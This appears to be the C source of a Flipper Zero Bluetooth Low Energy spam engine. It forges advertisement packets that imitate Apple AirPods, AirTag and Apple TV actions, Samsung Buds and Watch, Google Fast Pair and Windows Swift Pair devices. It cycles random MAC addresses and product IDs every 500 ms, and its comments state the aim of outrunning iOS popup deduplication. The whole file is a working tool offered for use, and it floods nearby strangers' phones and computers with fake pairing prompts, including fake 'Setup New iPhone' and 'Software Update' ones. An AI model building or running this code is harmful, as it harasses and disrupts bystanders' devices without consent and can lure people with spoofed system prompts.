#include "spam_engine.h"

#include <furi_hal_bt.h>
#include <furi_hal_random.h>
#include <extra_beacon.h>
#include <string.h>

#define engine_log_tag "BleSpamEngine"

// Payload builders ported BYTE-FOR-BYTE from the proven ESP32 app:
//   Flipper-Zero-ESP32-Portt/applications/main/ble_spam/ble_spam_payloads.h
// All payloads fit in EXTRA_BEACON_MAX_DATA_SIZE (31 bytes).

// Apple ProximityPair -- aligned byte-for-byte with Xtreme-Apps
// continuity.c make_packet() (ContinuityTypeProximityPair):
//   [0..3]   1E FF 4C 00  -- len=30, Apple manufacturer data (NO AD flags!)
//   [4]      07           -- Continuity: ProximityPair
//   [5]      19           -- payload size (25)
//   [6]      prefix       -- 0x01 not-your-device, 0x05 airtag, 0x07 new device
//   [7..8]   DEV_HI DEV_LO
//   [9]      55           -- status
//   [10]     battery      -- BCD: high nibble 0..9, low nibble 0..9
//   [11]     charging     -- BCD: high nibble 0..7, low nibble 0..9
//   [12]     lid open counter (any byte)
//   [13]     color
//   [14]     00           -- reserved
//   [15..30] 16 random bytes
// Battery/charging MUST be valid BCD (nibbles <= 9): iOS parses these fields
// and drops frames with out-of-range nibbles - raw random bytes here killed
// most popups. Returns 31.
static uint8_t build_pair(uint8_t* p, uint16_t model, uint8_t prefix) {
    memset(p, 0, 31);
    p[0] = 0x1E; p[1] = 0xFF; p[2] = 0x4C; p[3] = 0x00;
    p[4] = 0x07;
    p[5] = 0x19;
    p[6] = prefix;
    p[7] = (uint8_t)(model >> 8);
    p[8] = (uint8_t)(model & 0xFF);
    p[9] = 0x55;
    p[10] = (uint8_t)(((furi_hal_random_get() % 10) << 4) | (furi_hal_random_get() % 10));
    p[11] = (uint8_t)(((furi_hal_random_get() % 8) << 4) | (furi_hal_random_get() % 10));
    p[12] = (uint8_t)furi_hal_random_get(); // lid open counter
    p[13] = 0x00; // color (0x00 = White is valid for every model table)
    p[14] = 0x00;
    furi_hal_random_fill_buf(&p[15], 16);
    return 31;
}

// Apple NearbyAction -- identical to ble_spam_build_apple_nearby_action():
//   [0..3] 0A FF 4C 00  -- len=10, Apple
//   [4] 0F              -- Continuity: NearbyAction
//   [5] 05              -- payload size
//   [6] flags, [7] action_id, [8..10] random auth tag
// Returns 11.
static uint8_t build_action(uint8_t* p, uint8_t action, uint8_t flags) {
    memset(p, 0, 31);
    p[0] = 0x0A; p[1] = 0xFF; p[2] = 0x4C; p[3] = 0x00;
    p[4] = 0x0F;
    p[5] = 0x05;
    p[6] = flags;
    p[7] = action;
    furi_hal_random_fill_buf(&p[8], 3);
    return 11;
}

// Apple ProximityPair device table, copied from the ESP32 app
// (ble_spam_payloads.h). The engine cycles through ALL of these per packet --
// a fresh device_id per packet is what makes iOS show the popup repeatedly
// instead of deduplicating on a single static product id.
typedef struct {
    const char* name;
    uint16_t device_id;
} AppleDevice;

static const AppleDevice apple_devices[] = {
    {"AirPods Pro", 0x0E20},
    {"AirPods Pro 2nd Gen", 0x1420},
    {"AirPods Pro 2nd Gen USB-C", 0x2420},
    {"AirPods 4 ANC", 0x2820},
    {"AirPods 4", 0x2920},
    {"AirPods Max USB-C", 0x2B20},
    {"Powerbeats Pro 2", 0x2C20},
    {"Beats Solo 3", 0x0620},
    {"AirPods Max", 0x0A20},
    {"Beats Flex", 0x1020},
    {"AirTag", 0x0055},
    {"Hermes AirTag", 0x0030},
    {"AirPods", 0x0220},
    {"AirPods 2nd Gen", 0x0F20},
    {"AirPods 3rd Gen", 0x1320},
    {"Powerbeats 3", 0x0320},
    {"Powerbeats Pro", 0x0B20},
    {"Beats Solo Pro", 0x0C20},
    {"Beats Studio Buds", 0x1120},
    {"Beats X", 0x0520},
    {"Beats Studio 3", 0x0920},
    {"Beats Studio Pro", 0x1720},
    {"Beats Fit Pro", 0x1220},
    {"Beats Studio Buds+", 0x1620},
    {"Beats Solo 4", 0x2520},
    {"Beats Solo Buds", 0x2620},
    {"Powerbeats Fit", 0x2F20},
};

#define APPLE_DEVICE_COUNT ((uint16_t)COUNT_OF(apple_devices))

// Apple NearbyAction table, copied from the ESP32 app.
typedef struct {
    const char* name;
    uint8_t action_id;
    uint8_t flags;
} AppleAction;

static const AppleAction apple_actions[] = {
    {"AppleTV AutoFill", 0x13, 0xC0},
    {"AppleTV Connecting...", 0x27, 0xC0},
    {"Join This AppleTV?", 0x20, 0xC0},
    {"AppleTV Audio Sync", 0x19, 0xC0},
    {"AppleTV Color Balance", 0x1E, 0xC0},
    {"Setup New iPhone", 0x09, 0xC0},
    {"Transfer Phone Number", 0x02, 0xC0},
    {"HomePod Setup", 0x0B, 0xC0},
    {"Setup New AppleTV", 0x01, 0xC0},
    {"Pair AppleTV", 0x06, 0xC0},
    {"HomeKit AppleTV Setup", 0x0D, 0xC0},
    {"AppleID for AppleTV?", 0x2B, 0xC0},
    {"Apple Watch", 0x05, 0xC0},
    {"Apple Vision Pro", 0x24, 0xC0},
    {"Connect to other Device", 0x2F, 0xC0},
    {"Software Update", 0x21, 0x40},
    {"Unlock with Apple Watch", 0x2E, 0xC0},
    {"AirDrop Sidecar", 0x25, 0xC0},
    {"Vision Pro Setup", 0x2C, 0xC0},
};

#define APPLE_ACTION_COUNT ((uint16_t)COUNT_OF(apple_actions))

// Samsung Buds — manufacturer 0x7500, 31 bytes. Byte layout copied verbatim
// from Xtreme-Apps ble_spam protocols/easysetup.c (proven to trigger popup):
// fixed header incl. magic 14 15 03 21 01 09, model in the middle,
// fixed tail, then a truncated second AD segment (Android pads with zeros).
static uint8_t build_samsung(uint8_t* p, uint32_t model) {
    memset(p, 0, 31);
    uint8_t i = 0;
    p[i++] = 27; // AD length
    p[i++] = 0xFF; // Manufacturer Specific
    p[i++] = 0x75; // Samsung
    p[i++] = 0x00;
    p[i++] = 0x42;
    p[i++] = 0x09;
    p[i++] = 0x81;
    p[i++] = 0x02;
    p[i++] = 0x14;
    p[i++] = 0x15;
    p[i++] = 0x03;
    p[i++] = 0x21;
    p[i++] = 0x01;
    p[i++] = 0x09;
    p[i++] = (model >> 16) & 0xFF; // Buds model
    p[i++] = (model >> 8) & 0xFF;
    p[i++] = 0x01;
    p[i++] = model & 0xFF;
    p[i++] = 0x06;
    p[i++] = 0x3C;
    p[i++] = 0x94;
    p[i++] = 0x8E;
    p[i++] = 0x00;
    p[i++] = 0x00;
    p[i++] = 0x00;
    p[i++] = 0x00;
    p[i++] = 0xC7;
    p[i++] = 0x00;
    p[i++] = 16; // Truncated second AD segment
    p[i++] = 0xFF;
    p[i++] = 0x75;
    return 31;
}

// Samsung Watch (15 bytes).
static uint8_t build_samsung_watch(uint8_t* p, uint8_t id) {
    memset(p, 0, 31);
    p[0] = 0x0E; p[1] = 0xFF; p[2] = 0x75; p[3] = 0x00;
    p[4] = 0x01; p[5] = 0x00; p[6] = 0x02; p[7] = 0x00;
    p[8] = 0x01; p[9] = 0x01; p[10] = 0xFF; p[11] = 0x00;
    p[12] = 0x00; p[13] = 0x43; p[14] = id;
    return 15;
}

// Google Fast Pair — service data 0xFE2C with random known model id (14 bytes).
static uint8_t build_fastpair(uint8_t* p) {
    static const uint32_t models[] = {
        0xCD8256, 0x821F66, 0xF52494, 0xD446A7, 0x2D7A23,
        0x0E30C3, 0x92BBBD, 0x0577B1, 0x05A9BC, 0x00000C};
    uint32_t m = models[furi_hal_random_get() % COUNT_OF(models)];
    memset(p, 0, 31);
    p[0] = 0x03; p[1] = 0x03; p[2] = 0x2C; p[3] = 0xFE;
    p[4] = 0x06; p[5] = 0x16; p[6] = 0x2C; p[7] = 0xFE;
    p[8] = (m >> 16) & 0xFF; p[9] = (m >> 8) & 0xFF; p[10] = m & 0xFF;
    p[11] = 0x02; p[12] = 0x0A;
    // TX power byte: signed -100..+20 dBm, as in Xtreme fastpair.c
    p[13] = (uint8_t)((int32_t)(furi_hal_random_get() % 120) - 100);
    return 14;
}

// Microsoft Swift Pair with a device name (max 24 chars).
static uint8_t build_swiftpair(uint8_t* p, const char* name) {
    size_t n = strlen(name);
    if(n > 24) n = 24;
    p[0] = (uint8_t)(n + 6);
    p[1] = 0xFF; p[2] = 0x06; p[3] = 0x00;
    p[4] = 0x03; p[5] = 0x00; p[6] = 0x80;
    memcpy(&p[7], name, n);
    return (uint8_t)(n + 7);
}

// ===== Device list =====

typedef struct {
    const char* name;
    SpamDevType type;
    uint32_t param;
    uint8_t extra;
} SpamDevice;

static const SpamDevice spam_devices[] = {
    // extra=0 for ApplePair means "auto": AirTag family gets prefix 0x05,
    // other models alternate 0x07 (new-device popup) / 0x01 (not-your-device)
    // per packet, like Xtreme - alternating prevents iOS from deduping on
    // a single popup style.
    {"Apple (all)", SpamDevTypeApplePair, 0, 0x00},
    {"Apple NYD", SpamDevTypeApplePair, 0, 0x01},
    {"Apple Action", SpamDevTypeAppleAction, 0, 0xC0},
    {"Samsung Buds Pro", SpamDevTypeSamsung, 0xB8B905, 0},
    {"Samsung Watch", SpamDevTypeSamsungWatch, 0x0C, 0},
    {"Android Fast Pair", SpamDevTypeFastPair, 0, 0},
    {"Windows Swift Pair", SpamDevTypeSwiftPair, 0, 0},
    {"[ALL] Rotate", SpamDevTypeRotate, 0, 0},
};

#define SPAM_DEV_COUNT ((uint8_t)COUNT_OF(spam_devices))

// ===== Engine =====

struct BleSpamEngine {
    FuriThread* thread;
    volatile bool running;
    volatile bool exit;
    volatile uint8_t dev_index;
    volatile uint32_t packet_count;
    volatile uint32_t hold_ms; // identity hold time before MAC/payload rotate
    volatile bool beacon_ok;
    uint32_t cycle_idx; // per-rotation product/action cycling (like ESP32)
    uint32_t rotate_idx;
};

static uint8_t spam_build_payload(
    BleSpamEngine* engine,
    const SpamDevice* dev,
    uint8_t* data) {
    switch(dev->type) {
    case SpamDevTypeApplePair: {
        // Cycle through every Apple product per packet, exactly like the
        // ESP32 app's BleSpamAttackAppleDevice / AppleNotYourDevice modes.
        const AppleDevice* d = &apple_devices[engine->cycle_idx % APPLE_DEVICE_COUNT];
        uint8_t prefix = dev->extra;
        if(prefix == 0x00) {
            // Auto mode, same choices as Xtreme continuity.c:
            // AirTag family uses the airtag prefix, everything else
            // alternates new-device / not-your-device per packet.
            if(d->device_id == 0x0055 || d->device_id == 0x0030) {
                prefix = 0x05;
            } else {
                prefix = (engine->cycle_idx & 1) ? 0x07 : 0x01;
            }
        }
        engine->cycle_idx++;
        return build_pair(data, d->device_id, prefix);
    }
    case SpamDevTypeAppleAction: {
        const AppleAction* d = &apple_actions[engine->cycle_idx % APPLE_ACTION_COUNT];
        uint8_t flags = dev->extra;
        // Xtreme tweaks flags per action: 'Join This AppleTV?' gets extra
        // spam via 0xBF, glitched 'Setup New Device' uses 0x40.
        if(d->action_id == 0x20 && (engine->cycle_idx & 1)) flags = 0xBF;
        if(d->action_id == 0x09 && (engine->cycle_idx & 1)) flags = 0x40;
        engine->cycle_idx++;
        return build_action(data, d->action_id, flags);
    }
    case SpamDevTypeSamsung:
        return build_samsung(data, dev->param);
    case SpamDevTypeSamsungWatch:
        return build_samsung_watch(data, dev->extra);
    case SpamDevTypeFastPair:
        return build_fastpair(data);
    case SpamDevTypeSwiftPair:
        return build_swiftpair(data, "Flipper Z");
    case SpamDevTypeRotate: {
        const SpamDevice* nd =
            &spam_devices[engine->rotate_idx % (SPAM_DEV_COUNT - 1)];
        engine->rotate_idx++;
        return spam_build_payload(engine, nd, data);
    }
    default:
        return 0;
    }
}

// One identity (MAC + payload) is set up, started, and then left running
// CONTINUOUSLY for hold_ms before rotating. Tearing the beacon down every
// loop iteration (the old behavior) made each identity live only ~100ms,
// which iOS apparently treats as a glitch instead of a real device.
static int32_t spam_worker(void* context) {
    BleSpamEngine* engine = context;
    uint8_t data[31];
    uint8_t mac[6];
    uint32_t next_rotate = 0;

    GapExtraBeaconConfig cfg = {
        .min_adv_interval_ms = 20,
        .max_adv_interval_ms = 50,
        .adv_channel_map = GapAdvChannelMapAll,
        .adv_power_level = GapAdvPowerLevel_6dBm,
        // Public address type with random bytes, exactly like Xtreme-Apps
        // ble_spam, FindMy and example_ble_beacon. Random address type is
        // rejected by aci_gap_additional_beacon_start() on this stack.
        .address_type = GapAddressTypePublic,
    };

    while(!engine->exit) {
        if(engine->running) {
            uint32_t now = furi_get_tick();
            if(now >= next_rotate) {
                const SpamDevice* dev = &spam_devices[engine->dev_index];
                uint8_t len = spam_build_payload(engine, dev, data);

                // Fresh random MAC every rotation: iOS dedupes popups
                // by advertiser address, so a fixed MAC shows the popup only
                // once. Just fill random bytes and keep the public address
                // type (same as Xtreme-Apps randomize_mac()).
                furi_hal_random_fill_buf(mac, 6);
                memcpy(cfg.address, mac, 6);

                bool ok = true;
                // Stop may fail if beacon was never started; ignore that.
                furi_hal_bt_extra_beacon_stop();
                if(!furi_hal_bt_extra_beacon_set_config(&cfg)) {
                    ok = false;
                    FURI_LOG_E(engine_log_tag, "set_config failed");
                }
                if(ok && !furi_hal_bt_extra_beacon_set_data(data, len)) {
                    ok = false;
                    FURI_LOG_E(engine_log_tag, "set_data failed");
                }
                if(ok && !furi_hal_bt_extra_beacon_start()) {
                    ok = false;
                    FURI_LOG_E(engine_log_tag, "beacon start failed");
                }
                if(ok) engine->packet_count++;
                if(ok != engine->beacon_ok) {
                    engine->beacon_ok = ok;
                    if(!ok) {
                        FURI_LOG_E(
                            engine_log_tag,
                            "Beacon DOWN - radio stack: %d gatt/gap: %d",
                            furi_hal_bt_get_radio_stack(),
                            furi_hal_bt_is_gatt_gap_supported());
                    }
                }
                next_rotate = now + furi_ms_to_ticks(engine->hold_ms);
            }
            // Identity is broadcasting; just poll for rotation/stop.
            furi_delay_ms(50);
        } else {
            furi_hal_bt_extra_beacon_stop();
            engine->beacon_ok = false;
            next_rotate = 0; // rotate immediately on next start
            furi_delay_ms(50);
        }
    }

    furi_hal_bt_extra_beacon_stop();
    return 0;
}

BleSpamEngine* ble_spam_engine_alloc(void) {
    BleSpamEngine* engine = malloc(sizeof(BleSpamEngine));
    memset(engine, 0, sizeof(BleSpamEngine));
    engine->hold_ms = 500; // rotate identity/payload every 500ms (Xtreme
                           // cycles at 20-500ms; 2000ms was too slow to
                           // outrun iOS popup dedup)
    engine->thread =
        furi_thread_alloc_ex("BleSpamWorker", 2048, spam_worker, engine);
    furi_thread_start(engine->thread);
    return engine;
}

void ble_spam_engine_free(BleSpamEngine* engine) {
    furi_assert(engine);
    engine->exit = true;
    furi_thread_join(engine->thread);
    furi_thread_free(engine->thread);
    free(engine);
}

uint8_t ble_spam_engine_get_dev_count(void) {
    return SPAM_DEV_COUNT;
}

const char* ble_spam_engine_get_dev_name(uint8_t index) {
    if(index >= SPAM_DEV_COUNT) index = 0;
    return spam_devices[index].name;
}

uint8_t ble_spam_engine_get_dev(BleSpamEngine* engine) {
    furi_assert(engine);
    return engine->dev_index;
}

void ble_spam_engine_set_dev(BleSpamEngine* engine, uint8_t index) {
    furi_assert(engine);
    if(index >= SPAM_DEV_COUNT) index = 0;
    engine->dev_index = index;
    engine->rotate_idx = 0;
    engine->cycle_idx = 0;
}

void ble_spam_engine_start(BleSpamEngine* engine) {
    furi_assert(engine);
    engine->packet_count = 0;
    engine->running = true;
}

void ble_spam_engine_stop(BleSpamEngine* engine) {
    furi_assert(engine);
    engine->running = false;
}

bool ble_spam_engine_is_running(BleSpamEngine* engine) {
    furi_assert(engine);
    return engine->running;
}

uint32_t ble_spam_engine_get_packet_count(BleSpamEngine* engine) {
    furi_assert(engine);
    return engine->packet_count;
}

void ble_spam_engine_set_hold(BleSpamEngine* engine, uint32_t hold_ms) {
    furi_assert(engine);
    if(hold_ms < 200) hold_ms = 200;
    if(hold_ms > 10000) hold_ms = 10000;
    engine->hold_ms = hold_ms;
}

uint32_t ble_spam_engine_get_hold(BleSpamEngine* engine) {
    furi_assert(engine);
    return engine->hold_ms;
}

bool ble_spam_engine_get_beacon_ok(BleSpamEngine* engine) {
    furi_assert(engine);
    return engine->beacon_ok;
}
